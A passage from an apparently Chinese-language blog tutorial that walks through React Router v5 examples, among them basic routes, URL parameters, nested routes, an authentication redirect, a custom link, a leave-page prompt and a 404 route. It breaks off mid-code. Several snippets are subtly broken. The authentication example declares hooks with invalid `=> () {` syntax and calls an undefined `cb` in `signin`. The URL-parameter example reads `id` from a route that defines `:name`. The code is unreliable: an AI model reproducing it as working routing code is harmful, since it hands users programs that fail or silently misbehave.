<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">    Switch,</span><br><span class="line">    Route,</span><br><span class="line">    Link</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Home = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;</span><br><span class="line">        	&lt;h2&gt;Home&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> About = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;</span><br><span class="line">        	&lt;h2&gt;About&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Dashboard = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;</span><br><span class="line">        	&lt;h2&gt;Dashboard&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Example = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;Router&gt;</span><br><span class="line">        	&lt;ul&gt;</span><br><span class="line">            	&lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/about&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/dashboard&quot;</span>&gt;</span>Dashboard<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">           		&lt;Switch&gt;</span><br><span class="line">                	&lt;Route exact path=<span class="string">&quot;/&quot;</span>&gt;</span><br><span class="line">                    	&lt;Home /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span class="line">                    &lt;Route exact path=<span class="string">&quot;/about&quot;</span>&gt;</span><br><span class="line">                    	&lt;About /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span class="line">                    &lt;Route exact path=<span class="string">&quot;/dashboard&quot;</span>&gt;</span><br><span class="line">                    	&lt;Dashboard /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span class="line">                &lt;/Switch&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/Router&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Example;</span><br></pre></td></tr></table></figure>



<h5 id="2、URL-Parameters"><a href="#2、URL-Parameters" class="headerlink" title="2、URL Parameters"></a>2、URL Parameters</h5><p><code>UrlParameters.js</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">    Switch,</span><br><span class="line">    Route,</span><br><span class="line">    Link,</span><br><span class="line">    useParams</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ParamCom = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 &#x27;useParams&#x27; hook 来获取url参数</span></span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = useParams();</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;</span><br><span class="line">        	&#123;id&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Example = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;Router&gt;</span><br><span class="line">        	&lt;ul&gt;</span><br><span class="line">            	&lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/home&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/about&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/dashboard&quot;</span>&gt;</span>Dashboard<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">           		&lt;Switch&gt;</span><br><span class="line">                	&lt;Route exact path=<span class="string">&quot;/:name&quot;</span>&gt;</span><br><span class="line">                    	&lt;ParamCom /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span class="line">                &lt;/Switch&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/Router&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Example;</span><br></pre></td></tr></table></figure>



<h5 id="3、嵌套路由"><a href="#3、嵌套路由" class="headerlink" title="3、嵌套路由"></a>3、嵌套路由</h5><p><code>NestingRoute.js</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">  Switch,</span><br><span class="line">  Route,</span><br><span class="line">  Link,</span><br><span class="line">  useParams,</span><br><span class="line">  useRouteMatch</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Article = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; topicId &#125; = useParams()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;&#123;topicId&#125;&lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Articles = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;path, url&#125; = useRouteMatch()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>(</span><br><span class="line">    	&lt;Router&gt;</span><br><span class="line">        	&lt;div&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">              &lt;li&gt;</span><br><span class="line">                &lt;Link to=&#123;<span class="string">`<span class="subst">$&#123;url&#125;</span>/article1`</span>&#125;&gt;article1&lt;/Link&gt;</span><br><span class="line">              &lt;/li&gt;</span><br><span class="line">              &lt;li&gt;</span><br><span class="line">                &lt;Link to=&#123;<span class="string">`<span class="subst">$&#123;url&#125;</span>/article2`</span>&#125;&gt;article2&lt;/Link&gt;</span><br><span class="line">              &lt;/li&gt;</span><br><span class="line">              &lt;li&gt;</span><br><span class="line">                &lt;Link to=&#123;<span class="string">`<span class="subst">$&#123;url&#125;</span>/article3`</span>&#125;&gt;article3&lt;/Link&gt;</span><br><span class="line">              &lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">            &lt;Switch&gt;</span><br><span class="line">              &lt;Route exact path=&#123;path&#125;&gt;</span><br><span class="line">                &lt;h3&gt;Articles&lt;/h3&gt;</span><br><span class="line">              &lt;/Route&gt;</span><br><span class="line">              &lt;Route path=&#123;<span class="string">`<span class="subst">$&#123;path&#125;</span>/:topicId`</span>&#125;&gt;</span><br><span class="line">                &lt;Article /&gt;</span><br><span class="line">              &lt;/Route&gt;</span><br><span class="line">            &lt;/Switch&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/Router&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Example = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;Router&gt;</span><br><span class="line">        	&lt;ul&gt;</span><br><span class="line">            	&lt;li&gt;</span><br><span class="line">                	&lt;Link to=<span class="string">&#x27;/&#x27;</span>&gt;Home&lt;/Link&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                	&lt;Link to=<span class="string">&#x27;/article&#x27;</span>&gt;Article&lt;/Link&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">            	&lt;Switch&gt;</span><br><span class="line">                	&lt;Route exact path=<span class="string">&#x27;/&#x27;</span>&gt;Home&lt;/Route&gt;</span><br><span class="line">                    &lt;Route path=<span class="string">&#x27;/article&#x27;</span>&gt;</span><br><span class="line">                    	&lt;Articles /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span class="line">                &lt;/Switch&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/Router&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Example;</span><br></pre></td></tr></table></figure>



<h5 id="4、重定向（权限控制）"><a href="#4、重定向（权限控制）" class="headerlink" title="4、重定向（权限控制）"></a>4、重定向（权限控制）</h5><p><code>AuthRedirect.js</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useContext, createContext, useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">  Switch,</span><br><span class="line">  Route,</span><br><span class="line">  Link,</span><br><span class="line">  Redirect,</span><br><span class="line">  useHistory,</span><br><span class="line">  useLocation</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fakeAuth = &#123;</span><br><span class="line">  isAuthenticated: <span class="literal">false</span>,</span><br><span class="line">  signin() &#123;</span><br><span class="line">    fakeAuth.isAuthenticated = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(cb, <span class="number">100</span>); <span class="comment">// fake async</span></span><br><span class="line">  &#125;,</span><br><span class="line">  signout(cb) &#123;</span><br><span class="line">    fakeAuth.isAuthenticated = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(cb, <span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> authContext = createContext();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ProvideAuth = <span class="function">(<span class="params">&#123; children &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> auth = useProvideAuth();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;authContext.Provider value=&#123;auth&#125;&gt;</span><br><span class="line">      &#123;children&#125;</span><br><span class="line">    &lt;/authContext.Provider&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useAuth =&gt; () &#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(authContext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useProvideAuth =&gt; () &#123;</span><br><span class="line">  <span class="keyword">const</span> [user, setUser] = useState(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> signin = <span class="function"><span class="params">cb</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fakeAuth.signin(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      setUser(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">      cb();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> signout = <span class="function"><span class="params">cb</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fakeAuth.signout(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      setUser(<span class="literal">null</span>);</span><br><span class="line">      cb();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    user,</span><br><span class="line">    signin,</span><br><span class="line">    signout</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> AuthButton = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> history = useHistory();</span><br><span class="line">  <span class="keyword">let</span> auth = useAuth();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> auth.user ? (</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      Welcome!&#123;<span class="string">&quot; &quot;</span>&#125;</span><br><span class="line">      &lt;button</span><br><span class="line">        onClick=&#123;<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          auth.signout(<span class="function">() =&gt;</span> history.push(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        Sign out</span><br><span class="line">      &lt;/button&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">  ) : (</span><br><span class="line">    &lt;p&gt;You are not logged <span class="keyword">in</span>.&lt;/p&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PrivateRoute = <span class="function">(<span class="params">&#123; children, ...rest &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> auth = useAuth();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Route</span><br><span class="line">      &#123;...rest&#125;</span><br><span class="line">      render=&#123;<span class="function">(<span class="params">&#123; location &#125;</span>) =&gt;</span></span><br><span class="line">        auth.user ? (</span><br><span class="line">          children</span><br><span class="line">        ) : (</span><br><span class="line">          &lt;Redirect</span><br><span class="line">            to=&#123;&#123;</span><br><span class="line">              pathname: <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">              state: &#123; <span class="attr">from</span>: location &#125;</span><br><span class="line">            &#125;&#125;</span><br><span class="line">          /&gt;</span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br><span class="line">    /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PublicPage = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Public<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ProtectedPage = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Protected<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> LoginPage = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> history = useHistory();</span><br><span class="line">  <span class="keyword">let</span> location = useLocation();</span><br><span class="line">  <span class="keyword">let</span> auth = useAuth();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> &#123; <span class="keyword">from</span> &#125; = location.state || &#123; <span class="attr">from</span>: &#123; <span class="attr">pathname</span>: <span class="string">&quot;/&quot;</span> &#125; &#125;;</span><br><span class="line">  <span class="keyword">let</span> login = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    auth.signin(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      history.replace(<span class="keyword">from</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;You must log <span class="keyword">in</span> to view the page at &#123;<span class="keyword">from</span>.pathname&#125;&lt;/p&gt;</span><br><span class="line">      &lt;button onClick=&#123;login&#125;&gt;Log <span class="keyword">in</span>&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Example = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ProvideAuth&gt;</span><br><span class="line">      &lt;Router&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &lt;AuthButton /&gt;</span><br><span class="line"></span><br><span class="line">          &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">              &lt;Link to=<span class="string">&quot;/public&quot;</span>&gt;Public Page&lt;/Link&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">              &lt;Link to=<span class="string">&quot;/protected&quot;</span>&gt;Protected Page&lt;/Link&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">          &lt;Switch&gt;</span><br><span class="line">            &lt;Route path=<span class="string">&quot;/public&quot;</span>&gt;</span><br><span class="line">              &lt;PublicPage /&gt;</span><br><span class="line">            &lt;/Route&gt;</span><br><span class="line">            &lt;Route path=<span class="string">&quot;/login&quot;</span>&gt;</span><br><span class="line">              &lt;LoginPage /&gt;</span><br><span class="line">            &lt;/Route&gt;</span><br><span class="line">            &lt;PrivateRoute path=<span class="string">&quot;/protected&quot;</span>&gt;</span><br><span class="line">              &lt;ProtectedPage /&gt;</span><br><span class="line">            &lt;/PrivateRoute&gt;</span><br><span class="line">          &lt;/Switch&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/Router&gt;</span><br><span class="line">    &lt;/ProvideAuth&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Example;</span><br></pre></td></tr></table></figure>



<h5 id="5、自定义Link组件"><a href="#5、自定义Link组件" class="headerlink" title="5、自定义Link组件"></a>5、自定义Link组件</h5><p><code>CustomLink.js</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./CustomLink.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">    Switch,</span><br><span class="line">    Route,</span><br><span class="line">    Link,</span><br><span class="line">    useRouteMatch</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CustomLink = <span class="function">(<span class="params">&#123;to,label,activeExactOnly&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> match = useRouteMatch(&#123;</span><br><span class="line">        path: to,</span><br><span class="line">        exact: activeExactOnly</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        &lt;&gt;</span><br><span class="line">            &#123;match &amp;&amp; <span class="string">&#x27;&gt;&#x27;</span>&#125;</span><br><span class="line">            &lt;Link to=&#123;to&#125;&gt;&#123;label&#125;&lt;/Link&gt;</span><br><span class="line">        &lt;/&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Example = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        &lt;Router&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;CustomLink to=<span class="string">&quot;/&quot;</span> label=<span class="string">&quot;Home&quot;</span> activeExactOnly=&#123;<span class="literal">true</span>&#125;&gt;&lt;/CustomLink&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;CustomLink to=<span class="string">&quot;/about&quot;</span> label=<span class="string">&quot;About&quot;</span>&gt;&lt;/CustomLink&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;CustomLink to=<span class="string">&quot;/article&quot;</span> label=<span class="string">&quot;Articles&quot;</span>&gt;&lt;/CustomLink&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;CustomLink to=<span class="string">&quot;/new&quot;</span> label=<span class="string">&quot;News&quot;</span>&gt;&lt;/CustomLink&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">            &lt;hr/&gt;</span><br><span class="line">            &lt;Switch&gt;</span><br><span class="line">                &lt;Route path=<span class="string">&quot;/&quot;</span> exact&gt;Home&lt;/Route&gt;</span><br><span class="line">                &lt;Route path=<span class="string">&quot;/about&quot;</span>&gt;About&lt;/Route&gt;</span><br><span class="line">                &lt;Route path=<span class="string">&quot;/article&quot;</span>&gt;Articles&lt;/Route&gt;</span><br><span class="line">                &lt;Route path=<span class="string">&quot;/new&quot;</span>&gt;News&lt;/Route&gt;</span><br><span class="line">            &lt;/Switch&gt;</span><br><span class="line">        &lt;/Router&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Example;</span><br></pre></td></tr></table></figure>



<h5 id="5、防止转换"><a href="#5、防止转换" class="headerlink" title="5、防止转换"></a>5、防止转换</h5><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;useState&#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">    Link,</span><br><span class="line">    Route,</span><br><span class="line">    Switch,</span><br><span class="line">    Prompt</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> About = <span class="function">(<span class="params">&#123;lock&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        &lt;&gt;</span><br><span class="line">            &lt;Prompt when=&#123;lock&#125; message=<span class="string">&quot;请确认要离开about页面&quot;</span>&gt;&lt;/Prompt&gt;</span><br><span class="line">            &#123;<span class="string">`this is about page, before you leave, you need to confirm!`</span>&#125;</span><br><span class="line">        &lt;/&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PreventTransition = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [lock, setLock] = useState(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        &lt;Router&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;Link to=<span class="string">&quot;/&quot;</span>&gt;Home&lt;/Link&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;Link to=<span class="string">&quot;/about&quot;</span>&gt;About&lt;/Link&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">            &lt;hr /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;Switch&gt;</span><br><span class="line">                &lt;Route path=<span class="string">&quot;/&quot;</span> exact&gt;Home&lt;/Route&gt;</span><br><span class="line">                &lt;Route path=<span class="string">&quot;/about&quot;</span>&gt;</span><br><span class="line">                    &lt;About lock=&#123;lock&#125;/&gt;</span><br><span class="line">                &lt;/Route&gt;</span><br><span class="line">            &lt;/Switch&gt;</span><br><span class="line"></span><br><span class="line">            &lt;hr /&gt;</span><br><span class="line">            &lt;button onClick=&#123;<span class="function">() =&gt;</span> setLock(!lock)&#125;&gt;当前lock的值为&#123;lock.toString()&#125;设置lock的值为:&#123;(!lock).toString()&#125;&lt;/button&gt;</span><br><span class="line">        &lt;/Router&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> PreventTransition;</span><br></pre></td></tr></table></figure>



<h5 id="6、Not-Match（404）"><a href="#6、Not-Match（404）" class="headerlink" title="6、Not Match（404）"></a>6、Not Match（404）</h5><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">    Switch,</span><br><span class="line">    Route,</span><br><span class="line">    Link</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Home = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;</span><br><span class="line">        	&lt;h2&gt;Home&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> About = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;</span><br><span class="line">        	&lt;h2&gt;About&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> NotMatch = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;div&gt;</span><br><span class="line">        	&lt;h2&gt;<span class="number">404</span> Page Not Found&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Example = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    	&lt;Router&gt;</span><br><span class="line">        	&lt;ul&gt;</span><br><span class="line">            	&lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/about&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/thisisthewrongpath&quot;</span>&gt;</span>this is the wrong path<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span>&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">           		&lt;Switch&gt;</span><br><span class="line">                	&lt;Route exact path=<span class="string">&quot;/&quot;</span>&gt;</span><br><span class="line">                    	&lt;Home /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span class="line">                    &lt;Route exact path=<span class="string">&quot;/about&quot;</span>&gt;</span><br><span class="line">                    	&lt;About /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span class="line">                    &lt;Route path=<span class="string">&quot;*&quot;</span>&gt;</span><br><span class="line">                        &lt;NotMatch /&gt;</span><br><span class="line">                    &lt;/Route&gt;</span><br><span 